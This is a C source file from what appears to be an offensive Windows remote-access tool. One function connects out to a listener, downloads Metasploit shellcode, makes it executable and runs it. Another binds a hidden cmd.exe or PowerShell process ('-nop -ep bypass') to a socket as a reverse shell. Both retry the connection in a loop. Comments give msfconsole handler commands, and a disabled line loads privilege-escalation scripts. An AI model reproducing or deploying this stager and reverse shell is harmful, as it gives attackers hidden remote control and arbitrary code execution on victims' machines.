#include <WinSock2.h>
#include <stdio.h>
#include <Windows.h>
#include <wininet.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "SocketTools.h"

#include "LoadAPI.h"
#pragma warning(disable : 4996) // 'inet_addr': Use inet_pton() or InetPton() 


#define BUF_SIZE				1000
#define DEFAULT_BUFLEN			20000
#define CHECK_MSF_PAYLOAD_MSF	4

/*
// msfconsole -x "use exploits/multi/handler; set lhost 192.168.59.111; set lport 4443; set payload windows/meterpreter/reverse_tcp; exploit"
// msfconsole -x "use exploits/multi/handler; set lhost 192.168.59.111; set lport 4443; set payload windows/x64/meterpreter/reverse_tcp; exploit"

// https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c
*/

int GetPayloadSize(SOCKET clientSocket) {
	ULONG32 size;
	int payloadSize = recv(clientSocket, (char*)&size, 4, 0);
	if (payloadSize != CHECK_MSF_PAYLOAD_MSF) 
		return FALSE;
	return size;
}

int RecvShellcode(SOCKET clientSocket, char* shellcodeBuffer, int shellcodeSize) {
	int iResult = 0;
	int recvSize = 0;
	while (shellcodeSize > recvSize) {
		iResult = recv(clientSocket, shellcodeBuffer + recvSize, shellcodeSize - iResult, 0);
		if (iResult != SOCKET_ERROR)
			recvSize += iResult;
	}
	return recvSize;
}



BOOL MsfReverseTcp(Arguments listAgrument) {
	char ipAddress[IP_ADDRESS_SIZE];
	int port = listAgrument.port;
	sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", listAgrument.host);

	printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
	while (TRUE) {
		SOCKET clientSocket = ConnectRemoteServer(ipAddress, port);
		if (clientSocket > 0) {
			printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, port);
			ULONG32 size = GetPayloadSize(clientSocket);
			if (size > 0) {
				DWORD oldProtect = 0;
#if _WIN64
				char* shellcodeBuffer = VirtualAlloc(0, size + 10, MEM_COMMIT, PAGE_READWRITE);
#else
				char* shellcodeBuffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_READWRITE);
#endif
				if (shellcodeBuffer != NULL) {
#if _WIN64
					shellcodeBuffer[0] = 0x48;
					shellcodeBuffer[1] = 0xBF;
					memcpy(shellcodeBuffer + 2, &clientSocket, 8);
					int count = RecvShellcode(clientSocket, shellcodeBuffer + 10, size);
#else
					shellcodeBuffer[0] = 0xBF;
					memcpy(shellcodeBuffer + 1, &clientSocket, 4);
					int count = RecvShellcode(clientSocket, shellcodeBuffer + 5, size);
#endif
					VirtualProtect(shellcodeBuffer, size, PAGE_EXECUTE_READWRITE, &oldProtect);
					((void(*)()) shellcodeBuffer)();
					VirtualFree(shellcodeBuffer, 0, MEM_RELEASE);
				}
			}
			closesocket(clientSocket);
		}
		Sleep(5 * SECOND);
	}
	return TRUE;

}

/*

void InitConsole(HANDLE oldStdIn, HANDLE oldStdOut, HANDLE oldStdErr) {
	oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
	oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
	HANDLE hStdout = CreateFile(L"CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hStdin = CreateFile(L"CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
	SetStdHandle(STD_ERROR_HANDLE, hStdout);
	SetStdHandle(STD_INPUT_HANDLE, hStdin);
}
void EnableVirtualTerminalSequenceProcessing() {
	DWORD outConsoleMode = 0;
	HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	if (!GetConsoleMode(hStdOut, &outConsoleMode)) {
		printf("Could not get console mode");
	}
	outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
	if (!SetConsoleMode(hStdOut, outConsoleMode)) {
		printf("Could not enable virtual terminal processing");
	}
}*/

BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Ws2_32_API ws2_32, Arguments listAgrument) {
	BOOL exitProcess = FALSE;
	struct sockaddr_in sAddr;

	char* ipAddress = (char*)calloc(IP_ADDRESS_SIZE, sizeof(char));
	if (ipAddress == NULL)
		return FALSE;
	char* processPath = (char*)calloc(BUF_SIZE, sizeof(char));
	if (processPath == NULL) {
		free(ipAddress);
		return FALSE;
	}
	if (kernel32.CreateDirectoryAF(listAgrument.wincatDefaultDir, NULL) == 0 && GetLastError() == ERROR_PATH_NOT_FOUND)
		listAgrument.wincatDefaultDir = NULL;
	
	sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", listAgrument.host);
	sprintf_s(processPath, BUF_SIZE, "%ws", listAgrument.Process);

	sAddr = InitSockAddr(ipAddress, listAgrument.port);


	if (strstr(processPath, "cmd.exe") == NULL) {
		const char* cmdArgPs = " -nop -ep bypass";
		//const char* cmdArgPs = " -nop -ep bypass -c 'Import-Module .\\PsScript\powerup.ps1;Import-Module .\\PsScript\\Sherlock.ps1;Import-Module .\\PsScript\\PrivescCheck.ps1;Invoke-PrivescCheck'";
		sprintf_s(processPath, BUF_SIZE, "%ws %s", listAgrument.Process, cmdArgPs);
	}

	/*DWORD oldStdIn = 0, oldStdOut = 0, oldStdErr = 0;
	InitConsole(oldStdIn, oldStdOut, oldStdErr);
	EnableVirtualTerminalSequenceProcessing();*/
	printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
	while (!exitProcess) {
		SOCKET mySocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (GROUP)0, (DWORD)0);
		if (mySocket != SOCKET_ERROR) {
			if (connect(mySocket, (struct sockaddr*) &sAddr, sizeof(sAddr)) != SOCKET_ERROR) {
				STARTUPINFOA StartupInfo;
				PROCESS_INFORMATION ProcessInfo;
				printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, listAgrument.port);
				SendInitInfo(kernel32, advapi32,mySocket, NULL);

				memset(&StartupInfo, 0, sizeof(STARTUPINFOA));
				memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));
				StartupInfo.cb = sizeof(STARTUPINFOA);
				StartupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				StartupInfo.hStdInput = (HANDLE)mySocket;
				StartupInfo.hStdOutput = (HANDLE)mySocket;
				StartupInfo.hStdError = (HANDLE)mySocket;

				// kernel32.CreateProcessAF
				if (CreateProcessA(NULL, processPath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, listAgrument.wincatDefaultDir, &StartupInfo, &ProcessInfo)) {
					WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
					printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process shutdown !\n");
					CloseHandle(ProcessInfo.hProcess);
					CloseHandle(ProcessInfo.hThread);
					//exitPorcess = TRUE;
				}
			}
			closesocket(mySocket);
		}
		Sleep(5 * SECOND);
	}
	free(processPath);
	free(ipAddress);
	return TRUE;
}
